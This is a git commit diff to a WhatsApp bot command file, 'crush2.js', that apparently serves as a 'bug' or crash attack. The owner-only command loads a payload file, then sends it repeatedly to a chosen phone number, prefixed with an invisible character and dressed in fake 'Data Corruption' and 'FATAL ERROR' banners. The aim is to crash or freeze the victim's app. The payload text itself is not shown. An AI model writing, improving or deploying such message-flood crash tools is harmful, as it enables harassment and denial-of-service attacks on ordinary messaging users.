72b66e7f431d20f007c8ba2975aefbd6043d5a64
Loving Programming <officialstanlee143@gmail.com>
2026-02-11 16:48:40 +0300

    Update crush2.js

--- commands/bug/crush2.js
+++ commands/bug/crush2.js
@@ -1,24 +1,24 @@
 const fs = require('fs');
 const config = require('../../config');
+const { fancy } = require('../../lib/tools');
 
 module.exports = {
     name: "crush2",
-    execute: async (conn, msg, args, { from, fancy, isOwner }) => {
+    execute: async (conn, msg, args, { from, isOwner }) => {
         if (!isOwner) return;
         let target = args[0]?.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
         const payload = fs.readFileSync('./lib/payloads/crush2.txt', 'utf-8');
 
-        msg.reply(fancy("🥀 deploying the final crush strike..."));
-
-        for (let i = 0; i < 5; i++) {
+        for (let i = 0; i < 6; i++) {
+            await conn.sendPresenceUpdate('composing', target);
             await conn.sendMessage(target, { 
                 text: "\u200B" + payload,
                 contextInfo: { 
-                    externalAdReply: { title: "FATAL ERROR", body: "Device Integrity Compromised", mediaType: 1, thumbnailUrl: "https://files.catbox.moe/horror.jpg" },
+                    externalAdReply: { title: "🥀 INSIDIOUS CRUSH 🥀", body: "Data Corruption...", mediaType: 1, thumbnailUrl: config.menuImage },
                     forwardedNewsletterMessageInfo: { newsletterJid: config.newsletterJid }
                 } 
             });
         }
-        await conn.sendMessage(conn.user.id, { text: fancy("🥀 Mission Successful: CRUSH2 mission complete.") });
+        await conn.sendMessage(conn.user.id, { text: fancy("🥀 Mission Success: CRUSH2 Deployed.") });
     }
 };
